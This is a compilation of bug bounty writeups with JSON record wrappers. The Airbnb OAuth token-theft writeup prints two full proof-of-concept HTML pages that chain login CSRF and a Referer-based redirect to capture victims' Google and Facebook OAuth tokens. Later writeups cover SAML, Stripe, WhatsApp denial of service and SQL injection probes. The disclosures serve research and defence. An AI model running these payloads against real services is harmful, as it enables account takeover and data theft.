perform a login, but their mobile application utilizes locally stored access_tokens of the identity providers. Simply by replacing the stored access_token on a rooted mobile phone with a stolen access_code from a victim, an attacker can authenticate as a victim on the service provider’s mobile app instead. This is not a good thing. Airbnb case In the case of Airbnb, no tampering of redirect_uri’s for both the Airbnb apps for Facebook and Google was allowed, only a list of localized Airbnb sites was permitted here. However, the Airbnb mobile application did use an identity provider’s long-term access_token to authenticate a user transparently under the hood, which gave us means to increase the impact to authentication bypass, in case we were able to steal an access_token. Open redirect in OAuth endpoint If an unauthenticated user browsed to a page on www.airbnb.com that required authentication (e.g. https://www.airbnb.com/users/edit), he/she was redirected to the login page. However, after successfully logging in, the user was automatically redirected back to the original page he/she requested initially. This functionality was implemented through Airbnb’s redirect_params controller, which was not found vulnerable for external open redirect vulnerabilities. However, if the user was already logged in to Airbnb when returning from an identity provider, the /oauth_callback endpoint would automatically redirect the user based on the HTTP Referer header in the initiating OAuth login call to /oauth_connect. This redirect-back-after-login functionality in the OAuth flow while already being logged in was thus solely based on the HTTP Referer header, which can be controlled by an attacker by design. The vulnerability is demonstrated in the PoC video below. First, we open two airbnb.com/login browsers. In the first, we try to reach /users/edit, which results in extra redirect_params controller GET parameters being added to our URL. After successfully logging in in the first Airbnb browser tab, we now again “Log in with Facebook” via the second browser tab. By manually changing the HTTP Referer header in the call to https://www.airbnb.cat/oauth_connect and then successfully logging in on Facebook, the user will end up on the changed Referer value’s website eventually. Important to note is that the user must be successfully logged in in order for the final redirect to proceed. Of course, this movie only demonstrates the root cause of the vulnerability, not a practical exploitation. For that to succeed, an attacker must achieve three additional things: forge a request to the vulnerable endpoint with an arbitrary HTTP Referer header (1) while being authenticated to Airbnb (2) and get some sensitive data such as OAuth tokens in the URL (3) to effectively steal something useful. Making a request to the vulnerable endpoint with an arbitrary HTTP Referer header is quite easy: Simply embedding an external resource in a web page under the attacker’s control will make the browser send the Referer header with value this website’s page automatically. OAuth Login CSRF & OAuth token theft The not-so-precious-anymore OAuth authorization code value, which is communicated back in GET parameters to the Airbnb endpoint by Facebook & Google, gets lost during the redirections. However, both identity providers also offer communication of access_tokens via an URL fragment (the part after a hashtag in a URL) as opposed to URL parameters. URL fragments only exist on the client-side and are properly preserved by the browser during redirects and accessible from JavaScript, even by the last page in the redirection chain which is on a completely different origin. However, there are some additional problems: If we want to retrieve URL fragments from the identity providers to steal later on, we must be able to modify the OAuth request call to the provider (add “token” to the response_type parameter). However, this request is sent only after the initiating call to Airbnb OAuth endpoint https://www.airbnb.cat/oauth_connect in which the open-redirect-via-HTTP-referer-header exists, which is necessary for the overall attack. Airbnb’s callback endpoint expects an authorization code via a URL GET Parameter from the identity provider. However, when receiving a URL fragment instead, it will consider the authentication attempt invalid and hence not perform the final redirect, since we are not logged in. These two issues were both solved by exploiting a Login CSRF vulnerability via the same OAuth endpoint, as an OAuth login is initiated via a forgeable GET call to https://www.airbnb.cat/oauth_connect. An attacker first transparently logs in his/her victim unknowingly to their own Airbnb account via an identity provider, hereby planting the redirection seed via the HTTP Referer header. Now the victim is authenticated to Airbnb. Note that there was proper OAuth CSRF protection in place (“state” parameter), but since we are authenticating the victim into his/her own account, this does not prevent anything here. What is peculiar is that any additional OAuth authentication flow that follows will follow exactly the same path, regardless of whether it was successful or not! Now, when the attacker again forces the victim to make an additional Login via Facebook/Google but with response_type code,token as opposed to the normal code , the redirection flow of earlier will still work. Concretely, since we are still logged in, a redirect to the arbitrary HTTP Referer header’s value planted earlier will occur, this time with the URL fragments containing the victim’s identity provider OAuth tokens. Two PoCs were designed, one for each identity provider. The idea is exactly the same: Victim is authenticated to Facebook/Google in browser tab and has an Airbnb account linked to them, but is not necessarily logged in to Airbnb. Victim opens a website under the attacker’s control (https://www.arneswinnen.net/airbnb.com.<IDP>.html in the POC video) The attacker’s website will first unknowingly login the victim to Airbnb. In order not to interfere with potentially existing Airbnb sessions (in case the victim is currently browsing Airbnb), we chose to use the www.airbnb.cat localized domain in this PoC. By performing this login CSRF from the attacker’s owned website, the HTTP Referer header in the request to the Airbnb OAuth login endpoint will hold the value of the attacker’s website, hereby planting the seed. Once the victim is unknowingly logged in to www.airbnb.cat, the attacker now makes another Airbnb OAuth authentication request on behalf of the victim. However, this time the request is directly made to Facebook/Google (2nd step in normal OAuth flow), hereby allowing the attacker to set the response_type of the token to “code,token” (URL Fragments) as opposed to “code” (URL Parameters). Note that we keep the exact same value for the redirect_uri parameter. Since the victim is currently logged in and the previously injected redirect to https://www.arneswinnen.net/airbnb.com.<IDP>.html is still valid, the OAuth tokens in the URL Fragments of the IDP response will end up on the attacker’s website. Here, a simple JavaScript statement can read the URL Fragment in the browser, and effectively steal the OAuth values for both “code” and “token”. An attacker now gained two things: “code” OAuth token, which can be used to authenticate to airbnb.com as the victim. This is because the redirect_uri has not been changed during our attack, we only changed the communication of it from a GET parameter to an URL fragment (see step 4). “access_token” OAuth token, which can be used to query information of the victim at the Identity Provider and authenticate as the victim user on the Airbnb mobile application. Below you can find the source code of both HTML files hosted on https://www.arneswinnen.net during the PoC – they have been removed now. airbnb.com.gmail.html XHTML <!DOCTYPE html> <html> <body> <script> if(window.location.hash) { alert(window.location.hash) window.stop() // Fragment exists } </script> <object id=loginpage data=\"https://www.airbnb.cat/login/\" onload=\"alert('Login page loaded. Now attempting login'); document.getElementById('googlepage').setAttribute('data', 'https://www.airbnb.cat/oauth_connect?from=google_login&service=google');\"></object> <object id=googlepage width=\"400\" height=\"50\" onload=\"alert('Logged in & Referer header set. Now redirecting to steal the token!'); window.location = 'https://accounts.google.com/o/oauth2/auth?response_type=code,token&access_type=offline&client_id=622686756548-j87bjniqthcq1e4hbf1msh3fikqn892p.apps.googleusercontent.com&state=WCTSVKIWPIXNFWEBRUIBNBJGJPYIJN&scope=profile+email&redirect_uri=https%3A%2F%2Fwww.airbnb.cat%2Foauth_callback';\"></object> </body> </html> 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 <!DOCTYPE html> <html> <body> <script> if ( window . location . hash ) { alert ( window . location . hash ) window . stop ( ) // Fragment exists } </script> <object id = loginpage data = \"https://www.airbnb.cat/login/\" onload = \"alert('Login page loaded. Now attempting login'); document.getElementById('googlepage').setAttribute('data', 'https://www.airbnb.cat/oauth_connect?from=google_login&service=google');\" > </object> <object id = googlepage width = \"400\" height = \"50\" onload = \"alert('Logged in & Referer header set. Now redirecting to steal the token!'); window.location = 'https://accounts.google.com/o/oauth2/auth?response_type=code,token&access_type=offline&client_id=622686756548-j87bjniqthcq1e4hbf1msh3fikqn892p.apps.googleusercontent.com&state=WCTSVKIWPIXNFWEBRUIBNBJGJPYIJN&scope=profile+email&redirect_uri=https%3A%2F%2Fwww.airbnb.cat%2Foauth_callback';\" > </object> </body> </html> airbnb.com.facebook.html XHTML <!DOCTYPE html> <html> <body> <script> if(window.location.hash) { alert(window.location.hash) window.stop() } </script> <object id=loginpage data=\"https://www.airbnb.cat/login/\" onload=\"alert('Login page loaded. Now attempting login'); document.getElementById('googlepage').setAttribute('data', 'https://www.airbnb.cat/oauth_connect?from=facebook_login&service=facebook');\"></object> <object id=googlepage width=\"400\" height=\"50\" onload=\"alert('Logged in & Referer header set. Now redirecting to steal the token!'); window.location = 'https://www.facebook.com/dialog/oauth?response_type=code,token&client_id=138566025676&state=EQITJNHFHJYYDTBPYSQWSAFDLXHGLR&scope=email+user_birthday+user_likes+user_education_history+user_hometown+user_location+user_friends&redirect_uri=https%3A%2F%2Fwww.airbnb.cat%2Foauth_callback';\"></object> </body> </html> 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 <!DOCTYPE html> <html> <body> <script> if ( window . location . hash ) { alert ( window . location . hash ) window . stop ( ) } </script> <object id = loginpage data = \"https://www.airbnb.cat/login/\" onload = \"alert('Login page loaded. Now attempting login'); document.getElementById('googlepage').setAttribute('data', 'https://www.airbnb.cat/oauth_connect?from=facebook_login&service=facebook');\" > </object> <object id = googlepage width = \"400\" height = \"50\" onload = \"alert('Logged in & Referer header set. Now redirecting to steal the token!'); window.location = 'https://www.facebook.com/dialog/oauth?response_type=code,token&client_id=138566025676&state=EQITJNHFHJYYDTBPYSQWSAFDLXHGLR&scope=email+user_birthday+user_likes+user_education_history+user_hometown+user_location+user_friends&redirect_uri=https%3A%2F%2Fwww.airbnb.cat%2Foauth_callback';\" > </object> </body> </html> Timeline 04/06/2016: Submitted bug report to Airbnb 08/06/2016: Triaged by Airbnb 18/08/2016: Fixed by Airbnb 27/09/2016: $5.000 bounty awarded by Airbnb 10/06/2017: Permission granted to write blogpost by Airbnb Arne Swinnen Belgian. IT Security. Bug Bounty Hunter. 5 Comments Reply June 23, 2017 Raynold Hi Arne, Great fan of your bug bounty work. In your first video, when logging in with the modified referer header, you get redirected to the url in the referer header from /oauth_callback. However, in your second and third videos, for the first OAuth request made to /login, you get redirected to airbnb.cat from /authenticate even though the referer header has your URL. It seems like only /oauth_callback does the open redirection based on referer header. So, I have a couple of questions: 1) Did /authenticate always redirect to the top url instead of the referer header? 2) Why did the first video’s flow only end at /oauth_callback before redirecting to your domain, while the second and third videos make a request to /authenticate? They all begin in the same non-login state, so they should have the same flow right? Hope to hear from you soon =) Regards, Raynold Reply June 23, 2017 Arne Swinnen Hi Raynold, Great observation, I did not explain this 100% correctly. The external open redirect only occurred when you were already logged in and initiated another OAuth login flow through an identity provider (the /oauth_connect and /oauth_callback endpoints indeed). I have updated the blogpost and the first PoC video to explain this more clearly. Arne Reply June 23, 2017 fois Great work, congrats on the bounty! Thanks very much for the detailed info! Reply February 22, 2018 Hemanshu Wow! Great catch! Congrats 🙂 Reply April 8, 2020 Murali Kumar nice Leave a Reply Cancel reply Your email address will not be published. Required fields are marked * Comment * Name * Email * Δ © 2025 Arne Swinnen. All rights reserved. Hiero by aThemes"}
{"source_url": "https://www.arneswinnen.net/2016/11/authentication-bypass-on-sso-ubnt-com-via-subdomain-takeover-of-ping-ubnt-com/", "title": "Authentication bypass on Ubiquity’s Single Sign-On via subdomain takeover – Arne Swinnen", "friendly_explanation": "This is a bug bounty writeup from https://www.arneswinnen.net/2016/11/authentication-bypass-on-sso-ubnt-com-via-subdomain-takeover-of-ping-ubnt-com/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nAuthentication bypass on Ubiquity’s Single Sign-On via subdomain takeover – Arne Swinnen Arne Swinnen Security Blog Menu Close Home Research Exploit Development Mobile Security Publications Web Security Contact 0 Authentication bypass on Ubiquity’s Single Sign-On via subdomain takeover Posted on November 29, 2016 by Arne Swinnen I publicly disclosed a vulnerability that I responsibly disclosed to Ubiquity via the HackerOne platform. It concerned a subdomain takeover issue via Amazon Cloudfront (ping.ubnt.com) in combination with shared session cookies between subdomains on *.ubnt.com, which ultimately lead to a complete Authentication Bypass of their SSO system (sso.ubnt.com). It can be found here . Arne Swinnen Belgian. IT Security. Bug Bounty Hunter. Web Security Arne Swinnen Belgian. IT Security. Bug Bounty Hunter. More Posts Twitter LinkedIn Post navigation Hack.LU 2016 CTF DataOnly Writeup Authentication bypass on Airbnb via OAuth tokens theft Leave a Reply Cancel reply Your email address will not be published. Required fields are marked * Comment * Name * Email * Δ Search for: Recent Posts Authentication bypass on Uber’s Single Sign-On via subdomain takeover Authentication bypass on Airbnb via OAuth tokens theft Authentication bypass on Ubiquity’s Single Sign-On via subdomain takeover Recent Comments Atom on How I Could Steal Money from Instagram, Google and Microsoft Arne Swinnen on Authentication bypass on Uber’s Single Sign-On via subdomain takeover Jack on Authentication bypass on Uber’s Single Sign-On via subdomain takeover Archives June 2017 (2) November 2016 (1) October 2016 (2) September 2016 (1) July 2016 (1) June 2016 (1) May 2016 (1) March 2016 (1) February 2016 (1) August 2014 (2) November 2013 (2) September 2013 (1) © 2025 Arne Swinnen. All rights reserved. Hiero by aThemes"}
{"source_url": "https://hackemall.live/index.php/2020/03/31/akamai-web-application-firewall-bypass-journey-exploiting-google-bigquery-sql-injection-vulnerability/", "title": "Database Error", "friendly_explanation": "This is a bug bounty writeup from https://hackemall.live/index.php/2020/03/31/akamai-web-application-firewall-bypass-journey-exploiting-google-bigquery-sql-injection-vulnerability/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nDatabase Error Error establishing a database connection"}
{"source_url": "https://blog.intothesymmetry.com/2017/10/slack-saml-authentication-bypass.html", "title": "Slack SAML authentication bypass", "friendly_explanation": "This is a bug bounty writeup from https://blog.intothesymmetry.com/2017/10/slack-saml-authentication-bypass.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSlack SAML authentication bypass Skip to main content Into the symmetry Search Search This Blog Slack SAML authentication bypass October 26, 2017 tl;dr I found a severe issue in the Slack 's SAML implementation that allowed me to bypass the authentication. This has now been solved by Slack. Introduction IMHO the rule #1 of any bug hunter (note I do not consider myself one of them since I do this really sporadically) is to have a good RSS feed list. In the course of the last years I built a pretty decent one and I try to follow other security experts trying to \"steal\" some useful tricks. There are many experts in different fields of the security panorama and too many to quote them here (maybe another post). But one of the leading expert (that I follow) on SAML is by far Ioannis Kakavas . Indeed he was able in the last years to find serious vulnerability in the SAML implementation of Microsoft and Github . Usually I am more an \"OAuth guy\" but since both, SAML and OAuth, are nothing else that grandchildren of Kerberos learning SAML has been in my todo list for long time. The Github incident gave me the final motivation to start learning it. Learning SAML As said I was a kind of SAML-idiot until begin of 2017 but then I decided to learn it a little bit. Of course I started giving a look the the specification, but the best way I learn things is by doing and hopefully breaking. So I downloaded this great Burp extension called SAML Raider (great stuff, it saves so much time, you can edit any assertion on the fly). Then I tried to look if any of the service that routinely I use are SAML compliant. It turns out that many of them are. To name some: Github (but I guess Ioannis already took all the bugs there). So ping next (I actually found this funny JS Github bug giving a look into it, but not pertinent here) Hackerone , I gave a try here but nada, nisba, niente, nicht, niet Slack, Bingo see next section (this is probably meant for Enterprise customers) Slack SAML authentication bypass As said many of the service I use in my routine are SAML aware so I started to poke a bit them. The vulnerability I found is part of the class known as \" confused deputy problem \". I already talked about it in one of my OAuth blog post (tl;dr this is also why you never want to use OAuth implicit grant flow as authentication mechanism) and is really simple. Basically SAML assertions, between others contains an element called Audience and AudienceRestriction . Quoting Ioannis : The Assertion also contains an AudienceRestriction element that defines that this Assertion is targeted for a specific Service Provider and cannot be used for any other Service Provider. This means that if I present to a ServiceProvider A an assertion meant for ServiceProvider B, then the ServiceProvider A shoud reject it. Well between all other things I tried this very really simple attack against a Slack's SAML endpoint /sso/saml and guess what? It worked :o !! To be more concrete I used an old and expired ( yes the assertion was also expired!!) Github's Assertion I had saved somewhere in my archive that was signed for a subject different than mine (namely the username was not asanso aka me) and I presented to Slack. Slack happily accepted it and I was logged in Slack channel with the username of this old and expired Assertion that was never meant to be a Slack one!!! Wow this is scary.... Well well this look bad enough so I stopped quite immediately and open a ticket on Hackerone .... Disclosure timeline ...here the Slack security team was simply amazing... Thanks guys 02-05-2017 - Reported the issue via Hackerone. 03-05-2017 - Slack confirmed the issue. 26-08-2017 - Slack awarded a 3000$ bounty but still working with the affected customers in order to solve the vulnerability. Hence the ticket was kept open. 26-10-2017 - Slack closed the issue Acknowledgement I would like to thank the Slack security team in particular Max Feldman you guys rock, really!! Well that's all folks. For more SAML trickery follow me on Twitter . Share Get link Facebook X Pinterest Email Other Apps Labels bounty saml Labels: bounty saml Share Get link Facebook X Pinterest Email Other Apps Comments PanickedPacman said… Your Hackerone anchor tag is missing .com 27 October 2017 at 10:10 ll said… Fixed thanks!! 28 October 2017 at 12:24 davide said… Hi, would you share your RSS list? I'm always interested in reading good stuff ;-) thanks in advance 22 November 2017 at 04:39 Post a Comment Popular posts from this blog OpenSSL Key Recovery Attack on DH small subgroups (CVE-2016-0701) January 28, 2016 Usual Mandatory Disclaimer: IANAC (I am not a cryptographer) so I might likely end up writing a bunch of mistakes in this blog post... tl;dr The OpenSSL 1.0.2 releases suffer from a Key Recovery Attack on DH small subgroups . This issue got assigned CVE-2016-0701 with a severity of High and OpenSSL 1.0.2 users should upgrade to 1.0.2f. If an application is using DH configured with parameters based on primes that are not \"safe\" or not Lim-Lee (as the one in RFC 5114 ) and either Static DH ciphersuites are used or DHE ciphersuites with the default OpenSSL configuration (in particular SSL_OP_SINGLE_DH_USE is not set) then is vulnerable to this attack. It is believed that many popular applications (e.g. Apache mod_ssl) do set the SSL_OP_SINGLE_DH_USE option and would therefore not be at risk (for DHE ciphersuites), they still might be for Static DH ciphersuites. Introduction So if you are still here it means you wanna know more. And here is the thing. In my last bl... Share Get link Facebook X Pinterest Email Other Apps 23 comments Read more Critical vulnerability in JSON Web Encryption (JWE) - RFC 7516 March 13, 2017 tl;dr if you are using go-jose , node-jose , jose2go , Nimbus JOSE+JWT or jose4j with ECDH-ES please update to the latest version. RFC 7516 aka JSON Web Encryption (JWE) hence many software libraries implementing this specification used to suffer from a classic Invalid Curve Attack . This would allow an attacker to completely recover the secret key of a party using JWE with Key Agreement with Elliptic Curve Diffie-Hellman Ephemeral Static (ECDH-ES) , where the sender could extract receiver’s private key. Premise In this blog post I assume you are already knowledgeable about elliptic curves and their use in cryptography. If not Nick Sullivan 's A (Relatively Easy To Understand) Primer on Elliptic Curve Cryptography or Andrea Corbellini's series Elliptic Curve Cryptography: finite fields and discrete logarithms are great starting points. Then if you further want to climb the elliptic learning curve including the related attacks you might also want to visit https://s... Share Get link Facebook X Pinterest Email Other Apps 2 comments Read more The Curious Case of WebCrypto Diffie-Hellman on Firefox - Small Subgroups Key Recovery Attack on DH January 07, 2020 tl;dr Mozilla Firefox prior to version 72 suffers from Small Subgroups Key Recovery Attack on DH in the WebCrypto 's API. The Firefox's team fixed the issue r emoving completely support for DH over finite fields (that is not in the WebCrypto standard). If you find this interesting read further below. Premise In this blog post I assume you are already knowledgeable about Diffie-Hellman over finite fields and related attacks. If not I recommend to read any cryptography book that covers public key cryptography. Here is a really cool simple explanation by David Wong : I found a cooler way to explain Diffie-Hellman :D pic.twitter.com/DlPvGwZbto — David Wong (@cryptodavidw) January 4, 2020 If you want more details about Small Subgroups Key Recovery Attack on DH I covered some background in one of my previous post ( OpenSSL Key Recovery Attack on DH small subgroups (CVE-2016-0701) ). There is also an academic pape r where we examine the issue with some more rigors. ... Share Get link Facebook X Pinterest Email Other Apps 2 comments Read more twitter Verifiable Delay Functions from Supersingular Isogenies and Pairings with @luca_defeo @SimonMasson2 and Christophe Petit https://t.co/Z9hMv4q4wK pic.twitter.com/Z3yR8FCZbb — Antonio Sanso (@asanso) February 21, 2019 Books from me OAuth 2 in Action Archive January 2020 1 August 2019 1 July 2019 2 May 2019 1 December 2018 2 July 2018 1 April 2018 1 February 2018 1 January 2018 2 December 2017 1 October 2017 2 August 2017 2 June 2017 1 May 2017 2 April 2017 2 March 2017 1 November 2016 1 October 2016 1 June 2016 1 May 2016 1 April 2016 1 January 2016 2 December 2015 3 October 2015 1 September 2015 2 August 2015 1 June 2015 1 May 2015 1 April 2015 1 March 2015 1 January 2015 1 December 2014 1 October 2014 1 September 2014 2 August 2014 1 April 2014 2 February 2014 1 May 2013 2 October 2012 1 August 2012 1 June 2012 2 January 2012 1 January 2011 1 August 2010 1 June 2010 1 May 2010 2 March 2010 2 February 2010 1 Show more Show less Labels AS vulnerability bounty browser-security client vulnerability crypto csrf dh ecc isogeny ita jwe jwt kubernetes MS DRBG oauth oltu openssl pre-oauth saml tls vdf vulnerability Show more Show less Powered by Blogger"}
{"source_url": "https://www.jonbottarini.com/2017/04/03/inspect-element-leads-to-stripe-account-lockout-authentication-bypass/", "title": "Inspect Element leads to Stripe Account Lockout Authentication Bypass - Jon's Personal Blog", "friendly_explanation": "This is a bug bounty writeup from https://www.jonbottarini.com/2017/04/03/inspect-element-leads-to-stripe-account-lockout-authentication-bypass/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nInspect Element leads to Stripe Account Lockout Authentication Bypass - Jon's Personal Blog Jon's Personal Blog Jon's Personal Blog Home About Me Blog Twitter LinkedIn YouTube April 3, 2017 Inspect Element leads to Stripe Account Lockout Authentication Bypass A common thing I see happening with many popular applications is that a developer will disable an HTML element through the “class” attribute. It usually looks something like this: <a href=\"#\" name=\"disabled_button\" class=\"button small grey disabled\"> This works pretty well in some situations, but in other situations it can be manipulated to perform actions that really shouldn’t be done by an unauthenticated user. That’s exactly what happened in a bug I submitted to Stripe a few weeks ago. When you are logged into your Stripe account, you will be timed out after a certain amount of inactivity. Once this you reach this timeout, you aren’t able to make any changes on the account or view other pages until you re-authenticate by entering your password. Herein lies the problem with using a “disabled” class tag – an attacker can simply manipulate the page through inspect element to allow them to delete the disable class tag and view other pages, allowing them to send requests. In this video below, you’ll see how I’m locked out of a Stripe account because of inactivity, but by navigating to the “invite user” section of the timeout page through inspect element, I am able to invite myself as an administrator on the account that is timed out, without authenticating first. This, of course, requires a person to first be logged in to their Stripe account and leave their computer out in the open… but using this method you can render the entire lockout process completely useless on a Stripe.com account. It’s interesting nonetheless that the folks at Stripe made sure that a malicious user couldn’t change the web hooks… but inviting an administrator to the account is completely allowed. Stripe followed up and clarified by saying that simply dismissing the entire modal isn’t enough to bypass the authentication check, it is instead checked at the backend, but that check was accidentally removed in this situation which allowed me to invite another administrator. Stripe security was very responsive in resolving this issue and it was fixed shortly after I reported it. I asked permission before publishing this article. Bounty: $500. I have some more bounty writeups that are a bit more technical than this one coming soon, including a writeup on a CVE I discovered, so check back later for more updates. Additionally, you can follow me on Twitter to stay up to date with my bugs and what I’m doing, if you wish. In Authentication Bypass authentication , bypass , element , inspect , stripe Penetrating PornHub – XSS vulns galore (plus a cool shirt!) Abusing internal API to achieve IDOR in New Relic © 2024 Jon's Personal Blog"}
{"source_url": "https://medium.com/bugbountywriteup/whatsapp-dos-vulnerability-in-ios-android-d896f76d3253", "title": "WHATSAPP — DOS VULNERABILITY IN IOS & ANDROID | by vishnuraj | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/whatsapp-dos-vulnerability-in-ios-android-d896f76d3253. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nWHATSAPP — DOS VULNERABILITY IN IOS & ANDROID | by vishnuraj | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication WHATSAPP — DOS VULNERABILITY IN IOS & ANDROID vishnuraj 3 min read · Jun 7, 2017 -- Listen Share Hello readers, :) Today I wanna share with you one of my finding on Facebook; They reward me with a bounty of 500$ for this bug. Well, let’s introduce it. During my bug-hunting career I was always looking for a bug on Facebook, and I always try to find something into their acquisitions, subdomains and main domain, but all I got was a lot of duplicates and some bugs gets rejected anyway I don’t give up (XSS, CSRF,Broken Authentication and Session Management, etc..) and one day I had a brillian idea: find something on whatsapp,Facebook is a acquired more than 50 companies, including WhatsApp. The WhatsApp acquisition closed at a steep $19 billion the WhatsApp app that is available for Android and IOS and Windows phone and pc too. As you know, on WhatsApp you can chat with your WhatsApp-friends..so I was thinking a lot about what type of bug I can found and..yes, the simplest bug ever, DOS. Before this experience, I saw that some researchers founded some similar bugs into Facebook main domain and facebook messenger app, so I taught ..”i can “, then I start hunting. Honestly my idea was to find a Buffer Overflow (it was a bad idea because I wasn’t clear about that :) ) bug but then, after some research that released that is completely different if we talk about Buffer Overflow and Dos. In fact, I’ve reported this bug, with this title: “Buffer Overflow vulnerability on WhatsApp Messenger android app”, but I was wrong, was just a simple Dos; anyway Facebook Security team accepts this issue, and that’s what matters! :) I was thinking about crash the WhatsApp app by sending one message wich contains a malicious payload or special characters to a victim. This is the best part guys, how I ve found these special characters for the dos bug..Have you ever seen on facebook, these kind of characters on your timeline : https://pastebin.com/7aSNKVaV , check the special characetrs here..you can imagine what I idea I had. (Best idea ever..cause sometime we need to use our immagination in order to find something interesting) I decided to make up a contact file and add up few emojis + “special characters” in the area of Contact name that is shared .Then I shared this contact victom . I opened his chat the mobile screen turned black and bamm whatsapp crashed my sometime prompt to restart !! At first, Facebook security team doesn’t understand my issue, but after a clarifition they sended my issue to the appropriate team Hi Vishnu, We have looked into this issue and believe that the vulnerability has been patched. Please follow up with us if you believe that the patch does not resolve this issue. Thanks, Aaron Security And on Mar 4 the released the new Messenger APP for IOS/Android that contained the fix for my issue..and yes, I got 500$ as bounty: Hi Vishnu Vishnu, After reviewing this issue, we have decided to award you a bounty of $500. Below is an explanation of the bounty amount. We fulfill our bounties through Bugcrowd. While no private user information was at risk to be exposed, this is nevertheless a behavior that made it possible to crash/freeze WhatsApp, and a fix was implemented by the team. Thank you again for your report. We look forward to receiving more reports from you in the future. === Next Steps === Now, my name is there in the “2017” HOF year section, ;) “On behalf of over a billion users, we would like to thank the following people for making a responsible disclosure to us:” this page said facebook.com/whitehat/thanks, I wanna say thank you too Facebook Security Team for the collaboration and for the bounty, and also for added my name there, in one of the most important Hall Of Fame in this world! :) What we’ve learned today? Use your creativity, search bugs on IOS/Android etc, work hard and you will see the results. Hope you we’ll enjoy this writeup, and thanks again, for all the support! Timeline: Jan 15 2017 — — Initial Report Sent. Feb 7 2017 — -Aaron informed me they’ll insvestigate the issue. Feb 16 2017 — -Aaron informed me The Bug is Fixed. Mar 4 2017 $500 Awarded :) Stay awesome for the next writeUp! Cheers, Press enter or click to view image in full size ./vishnu :) Security Bug Bounty White Hat Hacker Hacker Hacker News -- -- Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by vishnuraj 711 followers · 74 following | OSCP | OSWE | eWPTXv2 | https://bugcrowd.com/vishnuraj No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@St00rm/sql-injection-via-stopping-the-redirection-to-a-login-page-52b0792d5592", "title": "SQL Injection Via Stopping redirection to a login page | by Abde Ouabala | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@St00rm/sql-injection-via-stopping-the-redirection-to-a-login-page-52b0792d5592. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSQL Injection Via Stopping redirection to a login page | by Abde Ouabala | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in SQL Injection Via Stopping redirection to a login page Abde Ouabala 2 min read · Mar 3, 2020 -- 3 Listen Share Hi everyone, in this simple small write up, I’ll describe how I was able to exploit a SQL injection vulnerability Via stopping redirection to a login Amin page! Actualy while testing on a subdomains , related to razer company called “ rsa3072.razersynapse.com “ going to access /admin page → page 200 → redirects again to the login page , Decided to stop the redirection using an known extention named “Noredirect” , and here is what i got exactly ( See the image down )! Press enter or click to view image in full size Actulay this is a bypass for the /admin part ! we got many sensitive data like game Keys , Emails , users creds ,.. After that i decided to search for more links , maybe there will be something interesting ! Access’d a game link , looks like → /source-data/view?source_data_id=[id ] tried to inject (‘) after the id , got a 500 inernal server error ! Tried a sql injection command to see if the response with return to 200!, the first thing i tried is order by 1- -, and yes i was right! the page returned 200 ok. So i decided to use sqlmap for auto detecting the type of injection and for easy injecting ! Here is a small picture to show the final injection with sqlmap , Never forget to stopp the redirection while injecting with sqlmap tool ! cuz it will automatiquuely redirects you to login page ! so no injection can be performed there! Press enter or click to view image in full size For manual injection , i’ll shot over other write ups Nshallah ! So That’s all ! Thank you for reading! Regards, St00rm 📝 Save this story in Journal . 👩‍💻 Wake up every Sunday morning to the week’s most noteworthy stories in Tech waiting in your inbox. Read the Noteworthy in Tech newsletter . Security Bug Bounty Noob Testing Web Apps -- -- 3 Written by Abde Ouabala 138 followers · 74 following \"No0b P3ntest3r Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://www.noob.ninja/2019/07/exploiting-tricky-blind-sql-injection.html", "title": "Exploiting a Tricky Blind SQL Injection inside LIMIT clause", "friendly_explanation": "This is a bug bounty writeup from https://www.noob.ninja/2019/07/exploiting-tricky-blind-sql-injection.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nExploiting a Tricky Blind SQL Injection inside LIMIT clause Skip to main content Search Search This Blog Noob Ninja! - Infosec Writeups Share Get link Facebook X Pinterest Email Other Apps July 21, 2019 Exploiting a Tricky Blind SQL Injection inside LIMIT clause Exploiting a Tricky Blind SQL Injection inside LIMIT clause REDIRECTING TO THE NEW BLOG ... Hey! Everyone I know its been a long time Since I last posted an article. so Today I am writing about a tricky SQL Injection that I was able to exploit in a private program. It was an in-scope subdomain which I got by using passive recon and the technology stack was basically PHP so I knew it had to be vulnerable at some point. so the functionality was like, There was an ability to create Image albums and inside an album, you could have uploaded various Images but there was Pagination ie. Only a few numbers of albums were visible on a Page and You need to click Page numbers to view other albums. While clicking at the Page numbers I noticed the request was like: /albums.php?page=2&num_max=20 It added num_max parameter which was nothing but told the limit of albums per page we could have increased or decreased it to increase the number of albums on a single Page. so I tried to check for SQL Injection by simply putting ’ \" and \\ etc. and It threw the SQL query in the response. Also, the error revealed that it was PostgreSQL DBMS. Query Looked Something like this: Select * from tbl_albums where page=2 order by album_date asc LIMIT 0,{{INPUT}} Where in Limit 0,{{input}} 0 is the offset ie. from which row to return records and {{input}} is the number of rows that should be returned from the offset and can also be written as LIMIT {{INPUT}} OFFSET 0 The application was escaping quotes. However, since I also used \\ to check and since the injection was in numeric context It caused an error. Select * from tbl_albums where page=2 order by album_date asc LIMIT 20\\ OFFSET 0 As far as I know, when Order by query is used along with LIMIT Clause we can’t use UNION Clause to inject our own 